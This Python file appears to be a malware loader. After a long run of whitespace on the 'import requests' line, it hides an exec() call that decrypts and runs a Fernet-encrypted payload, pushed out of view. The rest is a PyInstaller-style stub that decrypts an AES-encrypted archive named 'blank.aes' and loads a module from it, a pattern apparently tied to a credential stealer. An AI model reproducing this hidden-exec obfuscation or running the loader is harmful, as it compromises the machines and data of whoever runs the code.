import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'KSSZKRl3JWSE7yCzkvGLpxs7krW6pqcu7z8xiRSNbT8=').decrypt(b'gAAAAABlEElJrOBxhE7Lnubx8JCUYD6p-aKt5sIyPufq9N9IONTiLSHJyW6L38My7aPzz8fBkxiNRsc6Xo1i1-vMUH3ZRZnlM2UaXvFa10jskzvlrQE3cfGWrhOn4rHi0G_jAMyFmQ8tJk3Tt0CTz3JUuMwCFQctofu2iglornsI4gHw3wUFP1szyuRVokv2coMW--pONk2dKkFzT7UuYHsu_2Z_kzIi0w=='))
import os, sys, base64, zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter

zipfile = os.path.join(sys._MEIPASS, "blank.aes")
module = "stub-o"

key = base64.b64decode("%key%")
iv = base64.b64decode("%iv%")

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)

if os.path.isfile(zipfile):
    with open(zipfile, "rb") as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, iv, ciphertext)
    with open(zipfile, "wb") as f:
        f.write(decrypted)
    
    zipimporter(zipfile).load_module(module)
